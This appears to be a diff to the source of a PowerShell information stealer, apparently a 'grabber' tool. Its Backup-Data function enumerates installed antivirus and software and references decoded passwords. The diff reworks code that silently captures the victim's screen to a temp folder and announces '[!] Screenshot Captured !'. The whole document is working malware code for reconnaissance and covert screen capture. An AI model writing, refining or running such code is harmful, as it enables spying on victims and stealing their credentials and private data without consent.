@@ -207,28 +207,7 @@ function Backup-Data {
     }
     $avlist = Get-InstalledAV | Format-Table | Out-String
     
-    $wmicOutput = wmic path Win32_VideoController get VideoModeDescription /format:csv
-
-    $totalWidth = 0
-    $maxHeight = 0
-
-    $wmicOutput | ForEach-Object {
-        if ($_ -match "(\d+) x (\d+)") {
-            $width = [int]$matches[1]
-            $height = [int]$matches[2]
-            $totalWidth += $width
-            if ($height -gt $maxHeight) {
-                $maxHeight = $height
-            }
-        }
-    }
-
-    $combinedResolution = [PSCustomObject]@{
-        TotalWidth  = $totalWidth
-        MaxHeight   = $maxHeight
-    }
-
-    $screen = "$($combinedResolution.TotalWidth) x $($combinedResolution.MaxHeight)"
+    $screen = wmic path Win32_VideoController get VideoModeDescription /format:csv | Select-String -Pattern "\d{3,4} x \d{3,4}" | ForEach-Object { $_.Matches.Value }
 
     $software = Get-ItemProperty "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" |
     Where-Object { $_.DisplayName -ne $null -and $_.DisplayVersion -ne $null } |
@@ -833,16 +812,17 @@ Pass: $decodedPass
 
     $main_temp = "$env:localappdata\temp"
 
-    $screens = [Windows.Forms.Screen]::AllScreens
-    $top = ($screens.Bounds.Top | Measure-Object -Minimum).Minimum
-    $left = ($screens.Bounds.Left | Measure-Object -Minimum).Minimum
-    $bounds = [Drawing.Rectangle]::FromLTRB($left, $top, $combinedResolution.TotalWidth, $combinedResolution.MaxHeight)
-    $image = New-Object Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)
-    $graphics = [Drawing.Graphics]::FromImage($image)
-    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
+    $width, $height = $screen -split ' x '
+    $monitor = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
+    $top = $monitor.Top
+    $left = $monitor.Left
+    $bounds = [System.Drawing.Rectangle]::FromLTRB($left, $top, [int]$width, [int]$height)
+    $image = New-Object System.Drawing.Bitmap([int]$bounds.Width, [int]$bounds.Height)
+    $graphics = [System.Drawing.Graphics]::FromImage($image)
+    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
     $image.Save("$main_temp\screenshot.png")
     $graphics.Dispose()
-    $image.Dispose() 
+    $image.Dispose()
 
 
     Write-Host "[!] Screenshot Captured !" -ForegroundColor Green
